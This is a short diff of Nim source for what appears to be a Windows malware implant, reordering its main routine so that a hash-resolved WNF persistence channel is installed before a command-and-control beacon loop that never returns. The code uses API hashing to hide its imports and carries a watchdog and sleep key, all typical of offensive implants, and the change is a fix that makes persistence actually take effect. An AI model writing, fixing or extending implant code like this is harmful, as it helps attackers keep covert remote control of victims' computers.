@@ -29,10 +29,7 @@ proc WinMain() {.exportc: "WinMain", stdcall.} =
   # 4. Start watchdog
   watchdog.start(30_000'u32, 5'u32)
 
-  # 5. C2 beacon loop — renamed from run() to beaconLoop(key) (bug fix)
-  c2.beaconLoop(SLEEP_KEY)
-
-  # 6. WNF persistence channel (post-loop, in practice beaconLoop never returns)
+  # 5. WNF persistence channel
   block:
     const H_NTDLL:     uint32 = 0x22D3B5ED'u32
     const H_ADVAPI:    uint32 = 0x67208A49'u32
@@ -53,6 +50,9 @@ proc WinMain() {.exportc: "WinMain", stdcall.} =
       discard installWnfChannel(
         @[], SLEEP_KEY,
         fnSubscribe, fnUpdate, fnOpen, fnSet, fnClose)
+
+  # 6. C2 beacon loop — renamed from run() to beaconLoop(key) (bug fix)
+  c2.beaconLoop(SLEEP_KEY)
 
 when isMainModule:
   WinMain()
